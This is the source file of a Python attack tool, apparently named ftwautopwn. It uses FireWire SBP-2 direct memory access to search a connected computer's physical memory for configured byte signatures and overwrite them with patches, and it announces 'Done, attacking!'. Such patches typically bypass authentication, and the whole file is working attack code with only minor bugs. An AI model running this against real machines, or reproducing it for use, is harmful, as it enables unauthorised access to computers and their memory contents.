'''
Created on Jun 23, 2011

@author: carmaa
'''
from binascii import unhexlify, hexlify
from forensic1394 import Bus
from ftwautopwn.util import print_msg, Context
from time import sleep
import sys
import math

ctx = Context()

class Method(object):
    '''
    classdocs
    '''


    def __init__(self, number, desc, patches):
        '''
        Constructor
        '''
        self.number = number
        self.desc = desc
        self.patches = patches
        

class Patch:
    '''
    classdocs
    '''


    def __init__(self, sig, patch, offset):
        '''
        Constructor
        '''
        self.sig = sig
        self.patch = patch
        self.offset = offset

class MemoryFile:
    '''
    classdocs
    '''

    def __init__(self, file_name, pagesize):
        '''
        Constructor
        '''
        self.file = open(file_name, mode='rb')
        self.pagesize = pagesize
    
    def read(self, addr, numb, buf=None):
        self.file.seek(addr)
        return self.file.read(numb)  
    
    def readv(self, req):
        for r in req:
            #print(str(r[0]) + ' ' + str(r[1]))
            self.file.seek(r[0])
            yield (r[0], self.file.read(r[1]))
    
    def write(self, addr, buf):
        '''
        For now, dummy method in order to simulate a write
        '''
        pass
        

def run(context):
    global ctx
    ctx = context
    config = ctx.config
    encoding = ctx.encoding
    
    # Populate list with methods from config file
    methods = list()
    i = 1
    for method_name in config.sections():
        # Generate lists of corresponding sigs, patches and offs
        sigs = config.get(method_name, 'signature').split(':')
        patches = config.get(method_name, 'patch').split(':')
        pageoffsets = config.get(method_name, 'pageoffset').split(':')

        if (len(sigs) != len(patches) or \
            len(patches) != len(pageoffsets)):
            print_msg('!', 'Uneven number of signatures, patches and page ' 
                      'offsets in section %s of configuration file.' 
                      % method_name)
            sys.exit(1)

        # Populate patches for the given method
        p = list()
        for j in range(len(sigs)):
            p.append(Patch(sigs[j], patches[j], pageoffsets[j]))
        
        # Add patches to the method
        methods.append(Method(i, method_name, patches))
        
        i += 1
    
    list_targets(config)
    selected_target = select_target(config)
    
    # Parse the command line arguments
    sigs = unhexlify(bytes(config.get(selected_target, 'signature'), encoding))
    patch = unhexlify(bytes(config.get(selected_target, 'patch'), encoding))
    off = int(config.get(selected_target, 'pageoffset'))
    print_msg('+', 'You have selected: ' + selected_target)
    print_msg('|', 'Using signature: ' + hexlify(sigs).decode(encoding))
    print_msg('|', 'Using patch: ' + hexlify(patch).decode(encoding))
    print_msg('|', 'Using offset: ' + str(off))
    
    d = None
    if ctx.file_mode:
        d = MemoryFile(ctx.file_name, ctx.PAGESIZE)
    else:
        d = initialize_fw(d)
    
    try:
        # Find
        addr = findsig(d, sigs, off)
        print()
        print_msg('+', 'Signature found at 0x%x.' % addr)
        # Patch and verify
        d.write(addr, patch)
        assert d.read(addr, len(patch)) == patch
    except IOError:
        print('-', 'Signature not found.')


def list_targets(config):
    print_msg('+', 'Available targets:')
    i = 1
    for target in config.sections():
        print_msg(str(i), target)
        if ctx.verbose: print('\t' + config.get(target, 'notes'))
        i += 1


def select_target(config):
    selected = input('Please select target: ')
    nof_targets = len(config.sections())
    try:
        selected = int(selected)
    except:
        if selected == 'q': sys.exit()
        else:
            print_msg('!', 'Invalid selection, please try again. Type \'q\' ' \
                      'to quit.')
            return select_target(config)
    if selected <= nof_targets: return list(config)[selected]
    else:
        print_msg('!', 'Please enter a selection between 1 and ' + \
                  str(nof_targets) + '. Type \'q\' to quit.')
        return select_target(config)

def initialize_fw(d):
    b = Bus()
    # Enable SBP-2 support to ensure we get DMA
    b.enable_sbp2()
    for i in range(ctx.fw_delay, 0, -1):
        sys.stdout.write('[+] Initializing bus and enabling SBP2, please wait' \
                         ' %2d seconds\r' % i)
        sys.stdout.flush()
        sleep(1)
    # Open the first device
    d = b.devices()[0]
    d.open()
    print()
    print_msg('+', 'Done, attacking!\n')
    return d

def findsig(d, sig, off):
    # Skip the first 1 MiB of memory
    addr = 1 * 1024 * 1024 + off
    while True:
        # Prepare a batch of 128 requests
        r = [(addr + ctx.PAGESIZE * i, len(sig)) for i in range(0, 128)]
        for caddr, cand  in d.readv(r):
            if cand == sig: return caddr
        mibaddr = math.floor(addr / (1024 * 1024))
        sys.stdout.write('[+] Searching for signature, {0:>4d} MiB so far. ' \
                         'Data read: {1}'.format(mibaddr, hexlify(cand).decode(ctx.encoding)))
        sys.stdout.write('\r')
        sys.stdout.flush()
        addr += ctx.PAGESIZE * 128  
